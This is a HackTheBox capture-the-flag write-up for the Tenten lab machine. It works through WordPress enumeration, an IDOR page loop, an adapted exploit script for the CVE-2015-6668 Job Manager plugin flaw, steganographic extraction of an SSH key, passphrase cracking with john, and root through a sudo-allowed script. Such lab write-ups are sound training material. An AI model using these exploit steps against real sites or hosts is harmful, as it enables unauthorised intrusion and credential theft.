---
layout: page
title: HackTheBox Tenten Writeup
---

Tenten is a box that is running a web server that has wordpress. By doing this box, I learned how to enumerate wordpress and how to exploit outdated plugins. From here, this box is more CTF-like as there's an image with an id-rsa key hidden in it. For this part I used steghide and simply cracked it to find the password.

### Enumeration
To first enumerate the service, I run an nmap scan: ```nmap -sC -sV -oA scan 10.10.10.10```. This will create a file called ```scan.nmap``` which we can ```cat```. One can similarly use zenmap to get similar output. Shown below is the output the nmap scan gave me and the nmap report of the ports/hosts:
```
nmap -sC -sV -oA scan 10.10.10.10
Nmap scan report for 10.10.10.10
Host is up (0.061s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ec:f7:9d:38:0c:47:6f:f0:13:0f:b9:3b:d4:d6:e3:11 (RSA)
|   256 cc:fe:2d:e2:7f:ef:4d:41:ae:39:0e:91:ed:7e:9d:e7 (ECDSA)
|_  256 8d:b5:83:18:c0:7c:5d:3d:38:df:4b:e1:a4:82:8a:07 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.7.3
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Job Portal &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 17 01:57:49 2019 -- 1 IP address (1 host up) scanned in 16.18 seconds
```

![tenten](https://user-images.githubusercontent.com/41026969/52909819-4bb45400-325c-11e9-95f3-3e21e96ac4c7.PNG)

So we see that OpenSSH is open. We also see that the machine is running an Apache server with Wordpress, let's check out the website:

![tenten](https://user-images.githubusercontent.com/41026969/52909859-c41b1500-325c-11e9-82b6-306798925e27.PNG)

Investigating the page, we see that it's running a basic version of Wordpress. We can do further enumeration using ```wpscan```.

The command I use is:
```
root@josh0402:~/Desktop/Hacky Sack/!PenTesting/htb-tenten# wpscan --url http://10.10.10.10 --enumerate u 
```

This allows us the scan for potential vulnerabilities as well as enumerate users. This is what it outputs:

![image](https://user-images.githubusercontent.com/41026969/57188384-b8d69d80-6ecb-11e9-9720-e49dada4fe95.png)

### Exploitation

We see there is one username which is ```Takis```. Furthermore, we see there's an old job manager plugin with a few vulnerabilities that ```wpscan``` has shown us. Basically we are able to view different job applications and pages by changing the URL. For example, on this site, (from the homepage ```10.10.10.10```) we can click on ```Job Listing``` and ```Apply Now```. This will bring us to the following URL:
```
http://10.10.10.10/index.php/jobs/apply/8/
```

We can edit the ```/8/``` and play around with the numbers to view pages we aren't supposed to view.

Using curl and the source page (doing ```CTRL + U``` for source page), we can simply type up a script to check the different page titles in the source page. Here's what I typed up:
```
root@josh0402:~/Desktop/Hacky Sack/!PenTesting/htb-tenten# for i in $(seq 1 20); do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep '<title>'; done
```

Here's what it outputted:

![image](https://user-images.githubusercontent.com/41026969/57188569-e96c0680-6ece-11e9-847c-342ff636e1fa.png)

We see an interesting title page called ```HackerAccessGranted```...

Going back through the ```wpscan``` and looking through each link, [this website](https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/) has python code we can edit to get the picture ```HackerAccessGranted``` uploaded. Looking at the python code, I noticed it had some outdated dates and the file types had to be changed since we're looking for a picture, here's what I updated the code to:
```python
import requests

print """  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  
"""  
website = raw_input('Enter a vulnerable website: ')  
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2013,2019):  
    for i in range(1,13):
        for extension in {'jpg','png','jpeg'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
 ```
Now running the code we get the link to the picture:
```
root@josh0402:~/Desktop/Hacky Sack/!PenTesting/htb-tenten# python edited_exploit.py 
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://10.10.10.10
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```
The picture of the file:

![HackerAccessGranted](https://user-images.githubusercontent.com/41026969/57188672-e07c3480-6ed0-11e9-92c5-3aef6963d9c5.jpg)

Doing several checks like binwalk and strings, nothing showed up. After installing ```steghide``` (a steganography tool) I did further analysis:
```
root@josh0402:~/Desktop/Hacky Sack/!PenTesting/htb-tenten# steghide extract -sf HackerAccessGranted.jpg 
Enter passphrase: 
wrote extracted data to "id_rsa".
```

Doing ```cat id_rsa``` we see that hidden in the image there's an RSA key!

![image](https://user-images.githubusercontent.com/41026969/57188781-2be31280-6ed2-11e9-974b-0654f5b3917e.png)

Using [this website](http://www.cables.ws/cracking-rsa-private-key-passphrase-with-john-the-ripper/) as reference, I was able to crack the RSA key shown below:

First I converted it to john format and saved it as ```id_rsa_johnfile```:
```
root@josh0402:~/Desktop/Hacky Sack/!PenTesting/htb-tenten# ssh2john id_rsa > id_rsa_johnfile
```

Then since I've never used the ```rockyou.txt``` wordlist (which is usually the default people use to CTF), I had to unzip it:
```
root@josh0402:~/Desktop/Hacky Sack/!PenTesting/htb-tenten# sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

Last, we can do ```john -show ida_rsa_johnfile``` to view the cracked password:

![image](https://user-images.githubusercontent.com/41026969/57188856-d445a680-6ed3-11e9-99ce-a0162ee28c89.png)

Now we can try to log into Takis (the user we found from the ```wpscan``` from above) using the passphrase ```superpassword```.

##### note: you may need to do ```chmod 600 id_rsa``` to change the permissions for the originally rsa key

![image](https://user-images.githubusercontent.com/41026969/57188895-b167c200-6ed4-11e9-89f5-edb44aea436d.png)

We got a shell along with the ```user``` flag. Doing a quick ```sudo -l``` check reveals we can run a bash script called ```fuckin``` at ```/bin/fuckin```. Looking at what it does it simply executes arguments.

Doing ```sudo /bin/fuckin bash``` gets us root!

### Flags:
user: ```/home/takis/user.txt```

root: ```/root/root.txt```